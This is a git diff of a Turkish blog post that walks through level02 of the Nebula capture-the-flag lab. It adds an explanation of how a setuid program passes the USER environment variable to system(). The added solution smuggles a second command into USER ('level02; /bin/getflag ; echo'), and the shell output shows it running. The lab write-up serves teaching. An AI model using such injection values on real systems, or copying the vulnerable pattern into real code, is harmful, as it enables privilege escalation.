@@ -96,7 +96,7 @@ Bu bölüm de bir önceki ile benzer olup, bizden beklenen /home/flag02 dizinind
 
 {% highlight c %}
 {% raw %}
-    #include <stdlib.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
 #include <sys/types.h>
@@ -124,9 +124,23 @@ int main(int argc, char **argv, char **envp)
 }
 {% endraw %}
 {% endhighlight %}
-Programı çalıştırmadan önce kaynak kodu inceliyoruz.getenv("USER") fonksiyonu ile çağırılan processe ait USER çevresel değişkeni öğreniliyor.Değer asprintf fonksiyonunda 2. parametrede yerine konuluyor. Ardından bu string buffer değişkenine atanıyor.Daha sonra bu buffer değişkeni system() fonksiyonuna parametre olarak veriliyor.
+Programı çalıştırmadan önce kaynak kodu inceliyoruz.getenv("USER") fonksiyonu ile çağırılan processe ait USER çevresel değişkeni öğreniliyor.Değer asprintf() fonksiyonunda ikinci parametrede yerine konuluyor. Ardından bu string buffer değişkenine atanıyor.Daha sonra bu buffer değişkeni system() fonksiyonuna parametre olarak veriliyor.
 {% raw %}
-    level02@nebula:/home/flag01$ ./flag02
+    level02@nebula:/home/flag02$ ./flag02
     about to call system ("/bin/echo level02 is cool")
-    level02 is cool.
+    level02 is cool
+{% endraw %}
+Olayı tekrar özetlemek gerekirse alınan USER değişkeni ile bir string oluşturuluyor. Ve bu string sistem üzerinde komut olarak çalıştırılıyor. Buradan bir nevi injection yapmamız gerektiğini anlıyoruz.
+{% raw %}
+    level02@nebula:/home/flag02$ USER="level02; /bin/getflag ; echo"
+    level02@nebula:/home/flag02$ echo $USER
+    level02; /bin/getflag ; echo
+{% endraw %}
+Böylece buffer değişkeninin içeriği "/bin/echo level02; /bin/getflag ; echo is cool" olmuş oluyor.
+{% raw %}
+    level02@nebula:/home/flag02$ ./flag02
+    about to call system ("/bin/echo level02; /bin/getflag ; echo is cool")
+    level02
+    You have successfully executed getflag on a target account
+    is cool
 {% endraw %}
